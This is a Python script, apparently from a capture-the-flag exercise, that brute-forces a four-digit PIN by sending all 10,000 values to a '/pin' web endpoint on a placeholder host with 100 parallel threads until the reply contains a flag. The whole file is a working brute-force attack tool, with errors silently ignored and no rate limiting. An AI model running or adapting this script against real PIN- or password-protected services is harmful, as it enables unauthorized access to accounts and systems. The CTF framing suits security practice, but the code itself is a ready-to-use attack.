import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
from tqdm import tqdm  # Progress bar (pip install tqdm if needed)
import sys

ip = "machine_ip"
port = port

def try_pin(pin):
    formatted_pin = f"{pin:04d}"
    try:
        response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}", timeout=3)
        if response.ok:
            data = response.json()
            if 'flag' in data:
                return formatted_pin, data['flag']
            # Optional: Print wrong attempts (uncomment if you want verbose)
            # print(f"❌ {formatted_pin}: {data.get('message', 'Invalid')}", end='\r')
    except:
        pass
    return None

def main():
    print("🚀 Starting multithreaded PIN brute force...")
    print(f"Target: http://{ip}:{port}")
    
    found = False
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(try_pin, pin): pin for pin in range(10000)}
        
        # Progress bar with tqdm
        with tqdm(total=10000, desc="Trying PINs", unit="PIN") as pbar:
            for future in as_completed(futures):
                pin = futures[future]
                result = future.result()
                pbar.update(1)
                
                if result:
                    pin_found, flag = result
                    print(f"\n\n✅ CORRECT PIN FOUND: {pin_found}")
                    print(f"🏁 FLAG: {flag}")
                    found = True
                    break
    
    if not found:
        print("\n❌ No flag found after trying all 0000-9999 PINs")

if __name__ == "__main__":
    main()
